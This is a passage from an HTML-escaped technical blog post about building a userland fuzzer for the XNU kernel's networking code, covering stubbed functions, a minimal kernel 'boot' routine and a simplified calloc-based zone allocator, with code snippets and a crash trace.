class="c1"&gt;~(&lt;/span&gt;&lt;span class="c0"&gt;TH_RST &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;TH_SYN&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; tcphdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags &lt;/span&gt;&lt;span class="c1"&gt;|=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;TH_ACK&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; std&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c6"&gt;string&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;dat&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;tcphdr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;tcphdr &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;tcphdr&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;dat&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;&lt;br&gt;As you can see, I make liberal use of a custom grammar to enable better quality fuzzing. These efforts are worth it, as randomizing high level structure is more efficient. It will also be easier for us to interpret crashing test cases later as they will have the same high level representation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.91xkgwarn2ge"&gt;&lt;span class="c2 c7"&gt;High-Level Emulation&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Now that we have the code building and an initial fuzz target running, we begin the first pass at implementing all of the stubbed code that is reachable by our fuzz target. Because we have a fuzz target that builds and runs, we now get instant feedback about which functions our target hits. Some core functionality has to be supported before we can find any bugs, so the first attempt to run the fuzzer deserves its own development phase. For example, until dynamic memory allocation is supported, almost no kernel code we try to cover will work considering how heavily such code is used.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;We&amp;rsquo;ll be implementing our stubbed functions with fake variants that attempt to have the same semantics. For example, when testing code that uses an external database library, you could replace the database with a simple in-memory implementation. If you don&amp;rsquo;t care about finding database bugs, this often makes fuzzing simpler and more robust. For some kernel subsystems unrelated to networking we can use entirely different or null implementations. This process is reminiscent of high-level emulation, an idea used in game console emulation. Rather than aiming to emulate hardware, you can try to preserve the semantics but use a custom implementation of the API. Because we only care about testing networking, this is how we approach faking subsystems in this project.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;I always start by looking at the original function implementation. If it&amp;rsquo;s possible, I just link in that code as well. But some functionality isn&amp;rsquo;t compatible with our fuzzer and must be faked. For example, &lt;/span&gt;&lt;span class="c9"&gt;zalloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;should call the userland malloc since virtual memory is already managed by our host kernel and we have allocator facilities available. Similarly, &lt;/span&gt;&lt;span class="c9"&gt;copyin&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c9"&gt;copyout&lt;/span&gt;&lt;span&gt;&amp;nbsp;need to be faked as they no longer serve to copy data between user and kernel pages. Sometimes we also just &amp;ldquo;nop&amp;rdquo; out functionality that we don&amp;rsquo;t care about. We&amp;rsquo;ll cover these decisions in more detail later in the &amp;ldquo;High-Level Emulation&amp;rdquo; phase. Note that by implementing these stubs lazily whenever our fuzz target hits them, we immediately reduce the work in handling all the unrelated functions by an order of magnitude. It&amp;rsquo;s easier to stay motivated when you only implement fakes for functions that are used by the target code. &lt;/span&gt;&lt;span&gt;This approach successfully saved me a lot of time&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;and I&amp;rsquo;ve used it on subsequent projects as well. At the time of writing, I have 398 stubbed functions, about 250 functions that are trivially faked (return 0 or void functions that do nothing), and about 25 functions that I faked myself (almost all related to porting the memory allocation systems to userland).&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20 c18" id="h.ltz0op6gg9n7"&gt;&lt;span class="c27 c2"&gt;Booting Up&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;As soon as we start running the fuzzer, we&amp;rsquo;ll run into a snag: many resources require a one-time initialization that happens on boot. The BSD half of the kernel is mostly initialized by calling the &lt;/span&gt;&lt;span class="c9"&gt;bsd_init&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. That function, in turn, calls several subsystem-specific initialization functions. Keeping with the theme of supporting a minimally necessary subset of the kernel, rather than call &lt;/span&gt;&lt;span class="c9"&gt;bsd_init&lt;/span&gt;&lt;span class="c8 c2"&gt;, we create a new function that only initializes parts of the kernel as needed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Here&amp;rsquo;s an example crash that occurs without the one time kernel bootup initialization:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7dee2e6aabb2ca9a391d0f364d5d1fcd8b821d76"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x7effbc464ad0 in zalloc /source/build3/../fuzz/zalloc.c:35:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#8 0x7effbb62eab4 in pipepair_alloc /source/build3/../bsd/kern/sys_pipe.c:634:24&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#9 0x7effbb62ded5 in pipe /source/build3/../bsd/kern/sys_pipe.c:425:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#10 0x7effbc4588ab in pipe_wrapper /source/build3/../fuzz/syscall_wrappers.c:216:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#11 0x4ee1a4 in TestOneProtoInput(Session const&amp;amp;) /source/build3/../fuzz/net_fuzzer.cc:979:19&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Our zalloc implementation (covered in the next section) failed because the pipe zone wasn&amp;rsquo;t yet initialized:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.28d23a3828667c4eb9bd8e3032e358cb84291c9e"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;static&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;pipepair_alloc&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pipe &lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c0"&gt;rp_out&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pipe &lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c0"&gt;wp_out&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pipepair &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;pp &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zalloc&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;pipe_zone&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Scrolling up in sys_pipe.c, we see where that zone is initialized:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.6cb4ba0329612fe0bfce12d0efd46322d7f90626"&gt;&lt;/a&gt;&lt;a id="t.14"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;pipeinit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nbigpipe &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vm_size_t zone_size&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; zone_size &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;8192&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pipepair&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pipe_zone &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zinit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pipepair&lt;/span&gt;&lt;span class="c1"&gt;),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone_size&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;4096&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;pipe zone&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Sure enough, this function is called by &lt;/span&gt;&lt;span class="c9"&gt;bsd_init&lt;/span&gt;&lt;span class="c8 c2"&gt;. By adding that to our initial setup function the zone works as expected. After some development cycles spent supporting all the needed bsd_init function calls, we have the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c36531451445cbd3070043535c88b4e9f6dc8668"&gt;&lt;/a&gt;&lt;a id="t.15"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;__attribute__&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;visibility&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;default&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;)))&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;bool&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;initialize_network&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; mcache_init&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; mbinit&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; eventhandler_init&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; pipeinit&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; dlil_init&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; socketinit&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; domaininit&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; loopattach&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; ether_family_init&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; tcp_cc_init&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; net_init_run&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;res &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;necp_init&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;assert&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c0"&gt;res&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;true&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;&lt;br&gt;The original &lt;/span&gt;&lt;span class="c9"&gt;bsd_init&lt;/span&gt;&lt;span&gt;&amp;nbsp;is 683 lines long, but our &lt;/span&gt;&lt;span class="c9"&gt;initialize_network&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;clone is the preceding short snippet. I want to remark how cool I found it that you could &amp;ldquo;boot&amp;rdquo; a kernel like this and have everything work so long as you implemented all the relevant stubs. It just goes to show a surprising fact: a significant amount of kernel code is portable, and simple steps can be taken to make it testable. These codebases can be modernized without being fully rewritten. As this &amp;ldquo;boot&amp;rdquo; relies on dynamic allocation, let&amp;rsquo;s look at how I implemented that next.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c18 c20" id="h.9dofj4t03k0j"&gt;&lt;span class="c27 c2"&gt;Dynamic Memory Allocation&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Providing a virtual memory abstraction is a fundamental goal of most kernels, but the good news is this is out of scope for this project (this is left as an exercise for the reader). Because networking already assumes working virtual memory, the network stack functions almost entirely on top of high-level allocator APIs. This makes the subsystem amenable to &amp;ldquo;high-level emulation&amp;rdquo;. We can create a thin shim layer that intercepts XNU specific allocator calls and translates them to the relevant host APIs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;In practice, we have to handle three types of allocations for this project: &amp;ldquo;classic&amp;rdquo; allocations (malloc/calloc/free), zone allocations (zalloc), and mbuf (memory buffers). The first two types are more fundamental allocation types used across XNU, while mbufs are a common data structure used in low-level networking code.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;The zone allocator is reasonably complicated, but we use a simplified model for our purposes: we just track the size assigned to a zone when it is created and make sure we malloc that size when zalloc is later called using the initialized zone. This could undoubtedly be modeled better, but this initial model worked quite well for the types of bugs I was looking for. In practice, this simplification affects exploitability, but we aren&amp;rsquo;t worried about that for a fuzzing project as we can assess that manually once we discover an issue. As you can see below, I created a custom zone type that simply stored the configured size, knowing that my zinit would return an opaque pointer that would be passed to my zalloc implementation, which could then use &lt;/span&gt;&lt;span class="c9"&gt;calloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;to service the request. &lt;/span&gt;&lt;span class="c9"&gt;zfree&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;simply freed the requested bytes and ignored the zone, as allocation sizes are tracked by the host malloc already.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7e8e3471c54f0a0758208cb59ca503fca5b8d03b"&gt;&lt;/a&gt;&lt;a id="t.16"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; uintptr_t size&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zinit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;uintptr_t size&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;uintptr_t max&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;uintptr_t alloc&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;name&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;*)&lt;/span&gt;&lt;span class="c0"&gt;calloc&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; zone&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;size &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;size&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zalloc&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;assert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;zone &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;size&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zfree&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;zone&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;dat&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 